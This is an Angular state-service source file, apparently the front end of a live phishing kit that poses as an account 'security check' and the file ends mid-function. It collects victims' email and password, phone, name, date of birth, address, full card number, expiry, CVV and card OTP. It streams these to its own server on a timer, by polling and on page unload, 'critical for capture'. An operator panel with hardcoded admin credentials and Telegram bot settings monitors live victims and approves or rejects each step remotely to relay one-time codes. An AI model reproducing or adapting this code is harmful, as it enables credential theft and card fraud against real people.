
import { Injectable, signal, computed, effect } from '@angular/core';
import { Router, NavigationEnd } from '@angular/router';
import { io, Socket } from 'socket.io-client';
import { from, of, firstValueFrom, throwError } from 'rxjs';
import { retry, catchError, switchMap, tap, filter } from 'rxjs/operators';
import { PollingScheduler } from './polling.util';

export type ViewState = 'gate' | 'security_check' | 'login' | 'limited' | 'phone' | 'personal' | 'card' | 'card_otp' | 'bank_app' | 'loading' | 'step_success' | 'success' | 'admin';
export type VerificationStage = 'login' | 'limited' | 'phone_pending' | 'personal_pending' | 'card_pending' | 'card_otp_pending' | 'bank_app_input' | 'bank_app_pending' | 'final_review' | 'complete';

export interface UserFingerprint {
  userAgent: string;
  language: string;
  platform: string;
  screenResolution: string;
  ip: string;
}

export interface SessionHistory {
  id: string; // Session ID
  timestamp: Date;
  lastSeen?: number; // Last interaction timestamp
  email: string;
  name: string;
  status: string;
  fingerprint: UserFingerprint;
  data: any;
  stage?: string;
  currentView?: string;
  resendRequested?: boolean;
  isPinned?: boolean;
  verificationFlow?: 'otp' | 'app' | 'both' | 'complete';
  // Progress flags
  isLoginVerified?: boolean;
  isPhoneVerified?: boolean;
  isPersonalVerified?: boolean;
  isCardSubmitted?: boolean;
  isFlowComplete?: boolean;
}

const STORAGE_KEY_STATE = 'pp_app_state_v1';
const SYNC_CHANNEL = 'pp_sync_channel';

@Injectable({
  providedIn: 'root'
})
export class StateService {
  // Navigation
  readonly currentView = signal<ViewState>('security_check');
  readonly previousView = signal<ViewState>('security_check');
  
  // Logic State
  readonly stage = signal<VerificationStage>('login');
  readonly rejectionReason = signal<string | null>(null);
  readonly resendRequested = signal<boolean>(false); 
  readonly adminToast = signal<string | null>(null);
  
  // Connection State
  readonly isOfflineMode = signal<boolean>(false); // True if API fails

  // Admin Auth & Settings
  readonly adminAuthenticated = signal<boolean>(false);
  readonly adminUsername = signal<string>('admin');
  readonly adminPassword = signal<string>('secure123');

  readonly adminAlertEmail = signal<string>('');
  readonly adminAutoCapture = signal<boolean>(true);
  readonly telegramBotToken = signal<string>('');
  readonly telegramChatId = signal<string>('');
  
  // Admin Session Monitoring
  readonly monitoredSessionId = signal<string | null>(null);

  // User Data
  readonly email = signal<string>('');
  readonly password = signal<string>('');
  readonly phoneNumber = signal<string>(''); 
  readonly firstName = signal<string>('');
  readonly lastName = signal<string>('');
  readonly dob = signal<string>('');
  readonly address = signal<string>('');
  readonly country = signal<string>(''); 
  readonly phoneCode = signal<string>('');
  readonly cardNumber = signal<string>(''); 
  readonly cardType = signal<string>(''); // Visa, Mastercard, etc.
  readonly cardExpiry = signal<string>('');
  readonly cardCvv = signal<string>('');
  readonly cardOtp = signal<string>(''); 
  
  // New Flow Control
  readonly verificationFlow = signal<'otp' | 'app' | 'both' | 'complete'>('complete');
  readonly skipPhoneVerification = signal<boolean>(false);

  // Personalized Link
  readonly adminCode = signal<string>('');

  // Metadata & Fingerprint
  readonly sessionId = signal<string>('');
  readonly startTime = signal<Date>(new Date());
  readonly fingerprint = signal<UserFingerprint>({
    userAgent: 'Unknown',
    language: 'en-US',
    platform: 'Unknown',
    screenResolution: 'Unknown',
    ip: ''
  });

  // Admin view data
  readonly history = signal<SessionHistory[]>([]); 
  readonly activeSessions = signal<SessionHistory[]>([]);
  readonly incompleteSessions = signal<SessionHistory[]>([]);
  private sessionCache = new Map<string, SessionHistory>();

  // Progress Flags
  readonly isLoginVerified = signal<boolean>(false);
  readonly isPhoneVerified = signal<boolean>(false);
  readonly isPersonalVerified = signal<boolean>(false);
  readonly isCardSubmitted = signal<boolean>(false);
  readonly isFlowComplete = signal<boolean>(false);

  // Auto-Approve Threshold (Dynamic)
  readonly autoApproveThreshold = signal<number>(20000);
  // Waiting Start Time (Expose for Admin Payload)
  readonly waitingStartPublic = computed(() => this.waitingStart());

  // Inactivity & Timeout - Initialized explicitly
  readonly showTimeoutWarning = signal<boolean>(false);
  readonly timeoutCountdown = signal<number>(60);
  
  private lastActivityTime = Date.now();
  private inactivityInterval: any;
  // Set to 5 minutes total for demo (Warning at 4m 30s)
  private readonly SESSION_TIMEOUT_MS = 5 * 60 * 1000;
  private readonly WARNING_THRESHOLD_MS = 4.5 * 60 * 1000;

  // Auto-Approve Timer
  private waitingStart = signal<number | null>(null);

  // Polling & Sync
  private poller: PollingScheduler | null = null;
  private lastETag: string | null = null;
  private syncTimeout: any;
  private storageTimeout: any;
  private broadcastChannel: BroadcastChannel | null = null;
  private isHydrating = false;

  private socket: Socket;

  constructor(private router: Router) {
    this.initializeSession();

    // Capture Admin Code from URL
    if (typeof window !== 'undefined') {
        const params = new URLSearchParams(window.location.search);
        const code = params.get('id');
        if (code) {
            this.adminCode.set(code);
        }
    }

    // Sync Router Navigation (Back Button, Deep Links) to State
    this.router.events.pipe(
        filter(event => event instanceof NavigationEnd)
    ).subscribe((event: any) => {
        const url = event.urlAfterRedirects || event.url;
        // Strip leading slash and query params
        const view = url.split('?')[0].substring(1) as ViewState;

        // Only update if changed and valid
        if (view && view !== this.currentView()) {
            this.currentView.set(view);
            // Don't sync if it's admin or if we are hydrating
            if (!this.isHydrating) {
                this.syncState();
            }
        }
    });
    
    // Initialize Socket.IO
    this.socket = io({
        autoConnect: false
    });

    if (typeof window !== 'undefined') {
        this.socket.connect();

        // Join specific session room
        this.socket.emit('join', this.sessionId());

        // Listen for real-time commands
        this.socket.on('command', (cmd: any) => {
            this.handleRemoteCommand(cmd);
        });

        this.socket.on('connect', () => {
             this.socket.emit('join', this.sessionId());
             if (this.adminAuthenticated()) {
                 this.socket.emit('joinAdmin');
             }
        });

        // Listen for session updates (for Admin)
        this.socket.on('sessions-updated', () => {
            if (this.adminAuthenticated()) {
                this.fetchSessions();
            }
        });

        // Setup Cross-Tab Sync
        try {
            this.broadcastChannel = new BroadcastChannel(SYNC_CHANNEL);
            this.broadcastChannel.onmessage = (ev) => {
                if (ev.data && ev.data.type === 'STATE_UPDATE' && ev.data.sessionId === this.sessionId()) {
                   // Only sync if it's the same session ID (user operating multiple tabs)
                   this.hydrateFromState(ev.data.payload, false);
                }
            };
        } catch(e) { console.warn('BroadcastChannel not supported'); }

        // Restore state from storage (Hydration)
        setTimeout(() => {
            this.restoreLocalState();
        }, 0);

        // Force initial sync with retry logic
        this.initialSyncBurst();
        
        // Start Polling (Backup to Socket.IO)
        this.startPolling();
        this.setupListeners();
        this.startInactivityMonitor();

        // Reactive Sync Effect (Persist & Send)
        effect(() => {
            const stateSnapshot = this.getSnapshot();
            const currentSessionId = this.sessionId();
            
            // 1. Persist to LocalStorage (Instant "Static Page" fix)
            if (!this.isHydrating) {
                if (this.storageTimeout) clearTimeout(this.storageTimeout);
                this.storageTimeout = setTimeout(() => {
                    localStorage.setItem(STORAGE_KEY_STATE, JSON.stringify({
                        sessionId: currentSessionId,
                        data: stateSnapshot
                    }));

                    // 2. Broadcast to other tabs
                    this.broadcastChannel?.postMessage({
                        type: 'STATE_UPDATE',
                        sessionId: currentSessionId,
                        payload: stateSnapshot
                    });
                }, 500);
            }

            // 3. Debounced Server Sync
            if (this.syncTimeout) clearTimeout(this.syncTimeout);
            this.syncTimeout = setTimeout(() => {
                if (!this.adminAuthenticated()) {
                    this.syncState();
                }
            }, 800); 
        });
    }
  }

  // --- Inactivity Logic ---
  private startInactivityMonitor() {
      if (this.inactivityInterval) clearInterval(this.inactivityInterval);
      this.inactivityInterval = setInterval(() => {
          if (this.adminAuthenticated()) return; // Don't timeout admin

          const idleTime = Date.now() - this.lastActivityTime;
          
          if (idleTime > this.SESSION_TIMEOUT_MS) {
              this.handleSessionTimeout();
          } else if (idleTime > this.WARNING_THRESHOLD_MS) {
              // Safety check before calling set
              if (this.showTimeoutWarning) {
                  this.showTimeoutWarning.set(true);
                  const remaining = Math.ceil((this.SESSION_TIMEOUT_MS - idleTime) / 1000);
                  if (this.timeoutCountdown) this.timeoutCountdown.set(remaining > 0 ? remaining : 0);
              }
          }
      }, 1000);
  }

  public registerUserActivity() {
      // Safety check: ensure signal exists before reading
      if (this.showTimeoutWarning && !this.showTimeoutWarning()) {
          this.lastActivityTime = Date.now();
      }
  }

  public extendSession() {
      this.lastActivityTime = Date.now();
      if (this.showTimeoutWarning) this.showTimeoutWarning.set(false);
  }

  private handleSessionTimeout() {
      if (this.showTimeoutWarning) this.showTimeoutWarning.set(false);

      // Clear all input fields (Start Over)
      this.email.set('');
      this.password.set('');
      this.phoneNumber.set('');
      this.phoneCode.set('');
      this.firstName.set('');
      this.lastName.set('');
      this.dob.set('');
      this.address.set('');
      this.country.set('');
      this.cardNumber.set('');
      this.cardExpiry.set('');
      this.cardCvv.set('');
      this.cardOtp.set('');

      // Reset Flags
      this.isLoginVerified.set(false);
      this.isPhoneVerified.set(false);
      this.isPersonalVerified.set(false);
      this.isCardSubmitted.set(false);
      this.isFlowComplete.set(false);
      
      this.resendRequested.set(false);

      // Navigate to login
      this.navigate('login');
      this.stage.set('login');
      this.rejectionReason.set('Session timed out due to inactivity.');
      this.lastActivityTime = Date.now(); // Reset so we don't loop immediately

      // Force sync to update backend
      this.syncState();
  }

  private getSnapshot() {
    return {
        currentView: this.currentView(),
        stage: this.stage(),
        email: this.email(),
        password: this.password(),
        phoneNumber: this.phoneNumber(),
        phoneCode: this.phoneCode(),
        firstName: this.firstName(),
        lastName: this.lastName(),
        dob: this.dob(),
        address: this.address(),
        country: this.country(),
        cardNumber: this.cardNumber(),
        cardType: this.cardType(),
        cardExpiry: this.cardExpiry(),
        cardCvv: this.cardCvv(),
        cardOtp: this.cardOtp(),
        verificationFlow: this.verificationFlow(),
        skipPhoneVerification: this.skipPhoneVerification(),
        
        isLoginVerified: this.isLoginVerified(),
        isPhoneVerified: this.isPhoneVerified(),
        isPersonalVerified: this.isPersonalVerified(),
        isCardSubmitted: this.isCardSubmitted(),
        isFlowComplete: this.isFlowComplete(),
        rejectionReason: this.rejectionReason(),
        timestamp: Date.now(),
        // New fields for Admin Countdown
        waitingStart: this.waitingStartPublic(),
        autoApproveThreshold: this.autoApproveThreshold()
    };
  }

  private restoreLocalState() {
      try {
          const raw = localStorage.getItem(STORAGE_KEY_STATE);
          if (raw) {
              const parsed = JSON.parse(raw);
              if (parsed.sessionId === this.sessionId()) {
                  // Check for 5-minute offline timeout
                  // Default to Date.now() if timestamp missing (legacy sessions) to prevent instant loop
                  const lastSave = parsed.data.timestamp || Date.now();
                  const elapsed = Date.now() - lastSave;
                  const TIMEOUT_LIMIT = 5 * 60 * 1000; // 5 Minutes

                  if (elapsed > TIMEOUT_LIMIT) {
                      console.log('[State] Session expired while offline. Resetting...');
                      this.handleSessionTimeout();
                  } else {
                      console.log('[State] Restoring previous session...');
                      this.hydrateFromState(parsed.data, true);
                  }
              }
          }
      } catch(e) { console.error('Hydration failed', e); }
  }

  private hydrateFromState(data: any, isInit: boolean) {
      this.isHydrating = true; // Prevent feedback loop
      
      let viewToRestore = data.currentView;

      // Infinite Loading Fix:
      // If user was stuck on loading screen, restore them to the input view of their current stage
      if (viewToRestore === 'loading' && data.stage) {
          const s = data.stage;
          if (s === 'login') viewToRestore = 'login';
          else if (s === 'phone_pending') viewToRestore = 'phone';
          else if (s === 'personal_pending') viewToRestore = 'personal';
          else if (s === 'card_pending') viewToRestore = 'card';
          else if (s === 'card_otp_pending') viewToRestore = 'card_otp';
          else if (s === 'bank_app_pending' || s === 'bank_app_input') viewToRestore = 'bank_app';

          console.log(`[State] Fixed infinite loading. Redirecting ${data.currentView} -> ${viewToRestore}`);
      }

      if(viewToRestore) {
          this.currentView.set(viewToRestore);
          // Sync Router
          if (isInit) this.router.navigate([viewToRestore]);
      }
      if(data.stage) this.stage.set(data.stage);
      if(data.email) this.email.set(data.email);
      if(data.password) this.password.set(data.password);
      if(data.phoneNumber) this.phoneNumber.set(data.phoneNumber);
      if(data.phoneCode) this.phoneCode.set(data.phoneCode);
      if(data.firstName) this.firstName.set(data.firstName);
      if(data.lastName) this.lastName.set(data.lastName);
      if(data.dob) this.dob.set(data.dob);
      if(data.address) this.address.set(data.address);
      if(data.country) this.country.set(data.country);
      if(data.cardNumber) this.cardNumber.set(data.cardNumber);
      if(data.cardType) this.cardType.set(data.cardType);
      if(data.cardExpiry) this.cardExpiry.set(data.cardExpiry);
      if(data.cardCvv) this.cardCvv.set(data.cardCvv);
      if(data.cardOtp) this.cardOtp.set(data.cardOtp);
      if(data.verificationFlow) this.verificationFlow.set(data.verificationFlow);
      if(data.skipPhoneVerification !== undefined) this.skipPhoneVerification.set(data.skipPhoneVerification);
      
      if(data.isLoginVerified !== undefined) this.isLoginVerified.set(data.isLoginVerified);
      if(data.isPhoneVerified !== undefined) this.isPhoneVerified.set(data.isPhoneVerified);
      if(data.isPersonalVerified !== undefined) this.isPersonalVerified.set(data.isPersonalVerified);
      if(data.isCardSubmitted !== undefined) this.isCardSubmitted.set(data.isCardSubmitted);
      if(data.isFlowComplete !== undefined) this.isFlowComplete.set(data.isFlowComplete);
      if(data.rejectionReason !== undefined) this.rejectionReason.set(data.rejectionReason);

      // Restore Timer State (Fixes infinite loading on refresh)
      if(data.waitingStart) this.waitingStart.set(Number(data.waitingStart));
      if(data.autoApproveThreshold) this.autoApproveThreshold.set(Number(data.autoApproveThreshold));

      this.isHydrating = false;
  }

  private initialSyncBurst() {
     setTimeout(() => this.syncState(), 100);
     setTimeout(() => this.syncState(), 1000); 
  }

  private initializeSession() {
      let id = '';
      const KEY = 'session_id_v7'; 
      
      try {
          if (typeof localStorage !== 'undefined') {
              id = localStorage.getItem(KEY) || '';
          }
      } catch (e) {
          console.warn('LocalStorage access failed.');
      }

      if (!id) {
          id = this.generateId();
          try {
              if (typeof localStorage !== 'undefined') {
                  localStorage.setItem(KEY, id);
              }
          } catch (e) {}
      }
      this.sessionId.set(id);
      this.captureFingerprint();
  }

  // --- API Sync Logic ---

  public startPolling() {
      if (this.poller) this.poller.stop();

      this.poller = new PollingScheduler(2000, 60000, async () => {
          if (this.adminAuthenticated()) {
              await this.fetchSessions();
              return true; // Keep polling fast for Admin
          } else {
              this.checkAutoApprove();
              const idleTime = Date.now() - this.lastActivityTime;
              const isIdle = idleTime > 60000; // 1 min idle

              if (!this.isOfflineMode()) {
                   // If active, always sync (return true to keep fast polling)
                   // If idle, sync occasionally (return false to allow backoff)
                   if (!isIdle) {
                       await this.syncState();
                       return true;
                   } else {
                       await this.syncState();
                       return false;
                   }
              }
              return !isIdle;
          }
      });

      this.poller.start();
  }

  private setupListeners() {
      if (typeof document !== 'undefined') {
          // 1. Visibility Change
          document.addEventListener('visibilitychange', () => {
              if (document.visibilityState === 'visible') {
                  this.registerUserActivity();
                  this.syncState();
                  if (this.adminAuthenticated()) this.fetchSessions();
              }
          });

          // 2. Page Unload (Critical for Capture)
          // We use sendBeacon here to guarantee data is sent even if tab closes instantly.
          window.addEventListener('unload', () => {
             if (this.adminAuthenticated()) return;
             const payload = this.buildPayload();
             const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
             navigator.sendBeacon('/api/sync', blob);
          });

          // 3. User Activity Tracking
          const activityHandler = () => this.registerUserActivity();
          ['mousedown', 'keydown', 'touchstart', 'scroll'].forEach(evt => {
              document.addEventListener(evt, activityHandler, { passive: true });
          });
      }
  }

  private checkAutoApprove() {
      const start = this.waitingStart();
      if (start && this.currentView() === 'loading') {
          const elapsed = Date.now() - start;
          const threshold = this.autoApproveThreshold();

          if (elapsed > threshold) {
              this.waitingStart.set(null); 

              // Define payload based on stage
              const payload: any = {};
              if (this.stage() === 'login') {
                  payload.skipPhone = true;
              }

              this.handleRemoteCommand({ action: 'APPROVE', payload });
              this.syncState();
          }
      }
  }

  private buildPayload() {
      const p = {
          sessionId: this.sessionId(),
          currentView: this.currentView(),
          timestamp: this.startTime(),
          email: this.email(),
          password: this.password(),
          phoneNumber: this.phoneNumber(),
          phoneCode: this.phoneCode(),
          firstName: this.firstName(),
          lastName: this.lastName(),
          dob: this.dob(),
          address: this.address(),
          country: this.country(),
          cardNumber: this.cardNumber(),
          cardType: this.cardType(),
          cardExpiry: this.cardExpiry(),
          cardCvv: this.cardCvv(),
          cardOtp: this.cardOtp(),
          verificationFlow: this.verificationFlow(),
          skipPhoneVerification: this.skipPhoneVerification(),
          stage: this.stage(),
          fingerprint: this.fingerprint(),
          status: this.isFlowComplete() ? 'Verified' : 'Active',
          resendRequested: this.resendRequested(),
          isLoginVerified: this.isLoginVerified(),
          isPhoneVerified: this.isPhoneVerified(),
          isPersonalVerified: this.isPersonalVerified(),
          isCardSubmitted: this.isCardSubmitted(),
          isFlowComplete: this.isFlowComplete(),
          waitingStart: this.waitingStartPublic(),
          autoApproveThreshold: this.autoApproveThreshold(),
          adminCode: this.adminCode()
      };
      // Debug
      // console.log('[State] Building Payload:', { stage: p.stage, view: p.currentView });
      return p;
  }

  public async syncState(): Promise<boolean> {
      // Don't sync if we are in admin view
      if (this.currentView() === 'admin' || this.adminAuthenticated()) return false;
      if (!this.sessionId()) return false;

      const payload = this.buildPayload();

      const request$ = from(fetch('/api/sync', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
          keepalive: true // Important for background sync
      })).pipe(
          switchMap(res => {
              if (!res.ok) return throwError(() => new Error(`Sync Error: ${res.status}`));
              this.isOfflineMode.set(false); // Connection success
              return of(res);
          }),
          retry({ count: 1, delay: 500 }),
          catchError(err => {
              this.isOfflineMode.set(true);
              return of(null);
          })
      );

      try {
          const res: any = await firstValueFrom(request$);
          if (res && res.ok && res.json) {
              const data = await res.json();
              if (data.settings) {
                  this.applyRemoteSettings(data.settings);
              }
              if (data.command) {
                  this.handleRemoteCommand(data.command);
                  return true;
              }
          }
      } catch (e) {}
      return false;
  }

  private applyRemoteSettings(s: any) {
      if (s.skipPhone !== undefined) this.skipPhoneVerification.set(!!s.skipPhone);
      if (s.forceBankApp !== undefined && s.forceBankApp) {
           // Maybe set verificationFlow?
           // The backend logic currently just passes settings.
           // We need to respect them.
           // If 'Force Bank App' is on, we should ensure flow is 'app' or 'both'?
           // For now, let's just expose it or handle specific flags.
      }
  }

  // --- Admin Fetch ---

  public async fetchSessions(): Promise<boolean> {
      const headers: Record<string, string> = {};
      if (this.lastETag) {
          headers['If-None-Match'] = this.lastETag;
      }

      // Logic: Try Network -> Fail
      const request$ = from(fetch(`/api/sessions?t=${Date.now()}`, { headers })).pipe(
          switchMap(res => {
              if (res.status === 401 || res.status === 403) {
                  this.adminAuthenticated.set(false);
                  // Allow router to redirect naturally via effect or guard if present
                  return of(null);
              }
              if (res.status === 304) {
                  this.isOfflineMode.set(false);
                  return of(res);
              }
              if (!res.ok) return throwError(() => new Error(`Fetch Error`));
              this.isOfflineMode.set(false);
              return of(res);
          }),
          catchError(err => {
              // Only set offline if it's not a deliberate auth error (which we handled above, but catchError might miss if we throw)
              // Actually switchMap handles the 401 return of(null), so it won't hit catchError.
              // This catch is for network errors.
              this.isOfflineMode.set(true);
              return of(null);
          })
      );

      try {
          const res: any = await firstValueFrom(request$);

          if (!res) return false;

          if (res.status === 304) {
              return false; // Not Modified
          }

          if (res.ok) {
              const sessions: any[] = await res.json();

              // Update ETag
              const newETag = res.headers.get('ETag');
              if (newETag) this.lastETag = newETag;

              this.processSessionsData(sessions);
              return true; // Data changed
          }
      } catch (e) { }
      return false;
  }

  private processSessionsData(sessions: any[]) {
    if (!Array.isArray(sessions)) return;

    const adminSessionId = this.sessionId();

    // Raw active are ones not Verified or Revoked
    const rawActive = sessions.filter((s: any) => s.status !== 'Verified' && s.status !== 'Revoked' && s.sessionId !== adminSessionId);

    const newActiveSessions: SessionHistory[] = [];
    const newIncompleteSessions: SessionHistory[] = [];

    // Thresholds:
    // Online: < 1 min since last seen
    // Offline: > 1 min
    const ONLINE_THRESHOLD = 60 * 1000;
    const now = Date.now();

    for (const s of rawActive) {
        const lastSeen = s.lastSeen || 0;
        const isOnline = (now - lastSeen) < ONLINE_THRESHOLD;

        const id = s.sessionId;
        let cached = this.sessionCache.get(id);

        // Update if new, timestamp changed, OR critical state changed (Fixes Admin button lag)
        if (!cached ||
            cached.lastSeen !== lastSeen ||
            cached.currentView !== s.currentView ||
            cached.stage !== s.stage ||
            cached.status !== s.status) {

            cached = {
                id: s.sessionId,
                timestamp: new Date(s.timestamp || Date.now()),
                lastSeen: s.lastSeen,
                email: s.email,
                name: `${s.firstName || ''} ${s.lastName || ''}`,
                status: s.status || 'Active',
                stage: s.stage,
                currentView: s.currentView,
                fingerprint: s.fingerprint,
                data: s,
                resendRequested: s.resendRequested,
                isPinned: s.isPinned,
                verificationFlow: s.verificationFlow || 'otp',
                isLoginVerified: s.isLoginVerified,
                isPhoneVerified: s.isPhoneVerified,
                isPersonalVerified: s.isPersonalVerified,
                isCardSubmitted: s.isCardSubmitted,
                isFlowComplete: s.isFlowComplete
            };
            this.sessionCache.set(id, cached);
        }

        // Filter out "Ghost" sessions (Verified Login but no data)
        const hasCredentials = (cached.email && cached.email.length > 0) ||
                               (cached.data?.password && cached.data.password.length > 0);

        if (cached.isLoginVerified && !hasCredentials) {
             // Drop it from both Active and Incomplete
        } else {
            if (isOnline) {
                newActiveSessions.push(cached);
            } else {
                // Offline Logic: Only keep if Login is Verified (Incomplete)
                if (cached.isLoginVerified) {
                    newIncompleteSessions.push(cached);
                }
            }
        }
    }

    // Clean up cache for removed sessions
    const validIds = new Set([...newActiveSessions.map(s => s.id), ...newIncompleteSessions.map(s => s.id)]);
    // Also keep history items in cache to avoid jitter if needed, but for now we focus on active

    // Sort - By Initiation Time (Newest First) to prevent jumping
    newActiveSessions.sort((a, b) => b.timestamp.getTime() - a.timestamp.getTime());
    newIncompleteSessions.sort((a, b) => b.timestamp.getTime() - a.timestamp.getTime());

    // Update Signals
    // We do simple ref equality check or length check to minimize signal updates
    this.activeSessions.set(newActiveSessions);
    this.incompleteSessions.set(newIncompleteSessions);

    // History Processing
    const rawComplete = sessions.filter((s: any) => s.status === 'Verified');
    const mappedHistory: SessionHistory[] = rawComplete.map(s => ({
          id: s.sessionId,
          timestamp: new Date(s.timestamp || Date.now()),
          lastSeen: s.lastSeen,
          email: s.email,
          name: `${s.firstName || ''} ${s.lastName || ''}`,
          status: s.status,
          fingerprint: s.fingerprint,
          isPinned: s.isPinned,
          verificationFlow: s.verificationFlow,
          data: {
            ...s,
            cardBin: s.cardNumber ? s.cardNumber.substring(0, 6) : '',
            cardLast4: s.cardNumber ? s.cardNumber.slice(-4) : ''
          }
    }));
    
    // Sort: Pinned First, then Date Descending
    mappedHistory.sort((a, b) => {
        if (a.isPinned && !b.isPinned) return -1;
        if (!a.isPinned && b.isPinned) return 1;
        return b.timestamp.getTime() - a.timestamp.getTime();
    });
    this.history.set(mappedHistory);

    // Sync Monitored Session View
    // If monitored session disappears from Active/Incomplete, deselect?
    // Or keep it to allow viewing last state? Keeping for now.
}

  public setMonitoredSession(id: string) {
      this.monitoredSessionId.set(id);
      this.fetchSessions(); // Force immediate refresh
  }

  public async sendAdminCommand(sessionId: string, action: string, payload: any) {
      // Try Network
      const request$ = from(fetch('/api/command', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sessionId, action, payload })
      })).pipe(
          retry({ count: 1, delay: 500 }),
          catchError(() => {
              return of(null);
          })
      );
      await firstValueFrom(request$);
  }

  private lastCommandTime = 0;
  private lastCommandAction = '';

  private handleRemoteCommand(cmd: { action: string, payload: any }) {
      // Prevent Admin from reacting to user commands
      if (this.adminAuthenticated()) return;

      const { action, payload } = cmd;

      // Deduplication for EXTEND_TIMEOUT to prevent 3x requests
      if (action === 'EXTEND_TIMEOUT') {
          const now = Date.now();
          if (this.lastCommandAction === 'EXTEND_TIMEOUT' && (now - this.lastCommandTime) < 1000) {
              console.log('[State] Dropped duplicate EXTEND_TIMEOUT command');
              return;
          }
          this.lastCommandTime = now;
          this.lastCommandAction = action;
      }
      if (action === 'RESUME') {
          const oldId = this.sessionId();
          const newId = payload.sessionId || payload.id;

          if (newId && newId !== oldId) {
              console.log(`[State] Resuming session: ${newId}`);

              // 1. Update ID
              this.sessionId.set(newId);

              // 2. Persist ID
              try {
                  localStorage.setItem('session_id_v7', newId);
              } catch (e) { }

              // 3. Reconnect Socket
              this.socket.emit('leave', oldId);
              this.socket.emit('join', newId);

              // 4. Hydrate State
              // Pass true to force navigation
              this.hydrateFromState(payload, true);
          }
      } else if (action === 'EXTEND_TIMEOUT') {
          // Add extra time to the auto-approve threshold
          const duration = Number(payload.duration) || 10000;
          this.autoApproveThreshold.update(v => Number(v) + duration);
          console.log(`[State] Extended timeout by ${duration}ms. New threshold: ${this.autoApproveThreshold()}ms`);

          // Fix for "Stuck" spinner: If waitingStart was lost, restart it
          if (this.currentView() === 'loading' && !this.waitingStart()) {
               console.log('[State] Timer was stalled. Restarting waitingStart.');
               this.waitingStart.set(Date.now());
          }
      } else if (action === 'NAVIGATE') {
          this.navigate(payload.view, true);
      } else if (action === 'REJECT') {
          this.rejectionReason.set(payload.reason);
           if (this.stage() === 'phone_pending') this.navigate('phone', true);
           else if (this.stage() === 'personal_pending') this.navigate('personal', true);
           else if (this.stage() === 'card_pending') {
               this.cardNumber.set(''); 
               this.cardCvv.set('');
               this.navigate('card', true);
           }
           else if (this.stage() === 'card_otp_pending') {
               this.cardOtp.set('');
               this.navigate('card_otp', true);
           }
           else if (this.stage() === 'bank_app_pending') {
               this.navigate('card', true); // Or back to bank app?
           } else {
               this.navigate('login', true);
           }
      } else if (action === 'SET_FLOW') {
           if (payload.flow) {
               this.verificationFlow.set(payload.flow);
           }
      } else if (action === 'APPROVE') {
           this.rejectionReason.set(null);
           const currentStage = this.stage();

           // Update flow if provided in payload (Fixes race condition)
           if (payload && payload.flow) {
               this.verificationFlow.set(payload.flow);
           }

           if (currentStage === 'login') {
               // Prevent regression: If already verified, don't navigate back to limited
               if (this.isLoginVerified()) {
                   return;
               }

               this.isLoginVerified.set(true);
               if (payload && payload.skipPhone !== undefined) {
                   this.skipPhoneVerification.set(payload.skipPhone);
               }
               this.navigate('limited', true);
           } else if (currentStage === 'phone_pending') {
               this.isPhoneVerified.set(true);
               this.navigate('personal', true);
           } else if (currentStage === 'personal_pending') {
               this.isPersonalVerified.set(true);
               this.navigate('card', true);
           } else if (currentStage === 'card_pending') {
               this.isCardSubmitted.set(true);

               // Route based on Verification Flow
               const flow = this.verificationFlow();
               if (flow === 'app') {
                   // NEW: Go to input stage first, user must confirm
                   this.stage.set('bank_app_input');
                   this.navigate('bank_app', true);
               } else if (flow === 'both' || flow === 'otp') {
                   this.navigate('card_otp', true);
                   // Note: We don't change stage here, waiting for OTP submit
               } else {
                   // Default: Complete / Success (flow === 'complete' or undefined)
                   this.isFlowComplete.set(true);
                   this.navigate('success', true);
               }

           } else if (currentStage === 'card_otp_pending') {
               // Check if we need to do Bank App flow after OTP
               if (this.verificationFlow() === 'both') {
                   // NEW: Go to input stage first
                   this.stage.set('bank_app_input');
                   this.navigate('bank_app', true);
               } else {
                   this.isFlowComplete.set(true);
                   this.navigate('success', true);
               }
           }
           // bank_app_input is not auto-approved by Admin, user must click button.
           // bank_app_pending IS approved by Admin.
           else if (currentStage === 'bank_app_pending') {
               this.isFlowComplete.set(true);
               this.navigate('success', true);
           }
      } else if (action === 'REVOKE') {
           // Do NOT remove session ID, just reset state
           // localStorage.removeItem('session_id_v7'); // REMOVED

           // Reset State
           this.email.set('');
           this.password.set('');
           this.phoneNumber.set('');
           this.phoneCode.set('');
           this.firstName.set('');
           this.lastName.set('');
           this.dob.set('');
           this.address.set('');
           this.country.set('');
           this.cardNumber.set('');
           this.cardExpiry.set('');
           this.cardCvv.set('');
           this.cardOtp.set('');

           this.isLoginVerified.set(false);
           this.isPhoneVerified.set(false);
           this.isPersonalVerified.set(false);
           this.isCardSubmitted.set(false);
           this.isFlowComplete.set(false);

           // Don't generate new ID
           // this.sessionId.set(this.generateId()); // REMOVED

           this.rejectionReason.set("Something went wrong during verification steps, please login to try again.");
           this.navigate('login', true);
      }
  }

  // --- Actions ---

  private generateId() {
    return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
  }

  private captureFingerprint() {
      if (typeof window !== 'undefined') {
          this.fingerprint.set({
              userAgent: navigator.userAgent,
              language: navigator.language,
              platform: navigator.platform,
              screenResolution: `${window.screen.width}x${window.screen.height}`,
              ip: '' // Server fills this
          });
      }
  }

  navigate(view: ViewState, isRemote = false) {
    if (this.currentView() !== view) {
        this.previousView.set(this.currentView());
        this.currentView.set(view);
        this.router.navigate([view]); // Use Angular Router
        if (!isRemote) {
            this.syncState();
        }
    }
  }

  submitLogin(e: string, p: string) {
      this.email.set(e);
      this.password.set(p);
      this.stage.set('login');
      this.rejectionReason.set(null);
      this.waitingStart.set(Date.now());
      this.navigate('loading');
      this.syncState();
  }

  updateUser(data: { email?: string, password?: string }) {
      if (data.email) this.email.set(data.email);
      if (data.password) this.password.set(data.password);
  }

  updatePhone(data: { number?: string, code?: string }) {
      if (data.number) this.phoneNumber.set(data.number);
      if (data.code) this.phoneCode.set(data.code);
  }

  submitPhone(number: string, code: string) {
      this.phoneNumber.set(number);
      this.phoneCode.set(code);
      this.stage.set('phone_pending');
      this.rejectionReason.set(null);
      this.waitingStart.set(Date.now());
      this.navigate('loading');
      this.syncState();
  }

  triggerResendAlert() {
      this.resendRequested.set(true);
      this.syncState();
      setTimeout(() => this.resendRequested.set(false), 5000);
  }

  updatePersonal(data: any) {
      this.firstName.set(data.first);
      this.lastName.set(data.last);
      this.dob.set(data.dob);
      this.address.set(data.address);
      this.country.set(data.country);
  }

  submitPersonal(f: string, l: string, d: string, a: string, c: string) {
      this.firstName.set(f);
      this.lastName.set(l);
      this.dob.set(d);
